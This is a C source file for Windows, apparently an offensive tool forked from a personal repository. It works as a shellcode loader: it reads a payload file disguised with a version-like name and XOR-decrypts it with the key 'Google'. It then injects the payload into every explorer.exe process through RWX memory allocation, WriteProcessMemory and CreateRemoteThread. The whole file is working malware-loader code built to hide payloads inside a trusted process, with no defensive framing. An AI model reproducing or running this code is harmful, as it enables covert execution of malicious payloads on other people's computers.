// Code fork from https://github.com/borttappat/dotfiles/tree/main/h%C3%A4x

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// XOR key
#define XOR_KEY "Google"

int InjectIntoProcess(DWORD pid, unsigned char* buffer, size_t size) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return 0;

    LPVOID addr = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!addr) {
        CloseHandle(hProc);
        return 0;
    }

    WriteProcessMemory(hProc, addr, buffer, size, NULL);

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
    if (!hThread) {
        CloseHandle(hProc);
        return 0;
    }

    CloseHandle(hThread);
    CloseHandle(hProc);
    return 1;
}

int main() {
    // Read the payload from the file
    HANDLE hFile = CreateFileA("1.8.00.21151.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    // Get file size
    DWORD fileSize = GetFileSize(hFile, NULL);

    // Allocate buffer for payload
    unsigned char* buffer = (unsigned char*)malloc(fileSize);

    // Read file into buffer
    DWORD bytesRead;
    ReadFile(hFile, buffer, fileSize, &bytesRead, NULL);

    // Close the file
    CloseHandle(hFile);

    // Decrypt the payload using XOR
    size_t key_len = strlen(XOR_KEY);
    for (size_t i = 0; i < fileSize; i++) {
        buffer[i] ^= XOR_KEY[i % key_len];
    }

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 2;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    int injected = 0;

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
                if (InjectIntoProcess(pe.th32ProcessID, buffer, fileSize)) {
                    injected++;
                }
            }
        } while (Process32Next(snap, &pe));
    }

    CloseHandle(snap);
    free(buffer);

    return (injected > 0) ? 0 : 3;
}
